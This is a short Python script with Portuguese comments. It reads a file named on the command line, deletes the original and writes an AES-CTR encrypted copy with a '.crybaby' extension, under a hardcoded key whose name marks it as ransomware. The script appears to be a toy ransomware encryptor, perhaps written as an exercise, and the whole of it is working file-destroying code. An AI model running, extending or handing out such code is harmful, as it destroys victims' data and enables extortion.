import os
import pyaes
import argparse

# Pegando o caminho/nome do arquivo pelo comando no CLI.
parser = argparse.ArgumentParser()
parser.add_argument("arquivo", help="é o nome do arquivo")

args = parser.parse_args()

# Lendo o arquivo e removendo o original
file = open(args.arquivo, "rb")
data = file.read()
file.close()

os.remove(args.arquivo)

# Definindo chave de criptografia
key = b"chavederansombye"
aes = pyaes.AESModeOfOperationCTR(key)

# Gerando novo arquivo criptografado
crypto_data = aes.encrypt(data)

new_file = args.arquivo + ".crybaby"
encrypt_file = open(f'{new_file}','wb')
encrypt_file.write(crypto_data)
encrypt_file.close()

print("Arquivo criptografado!")
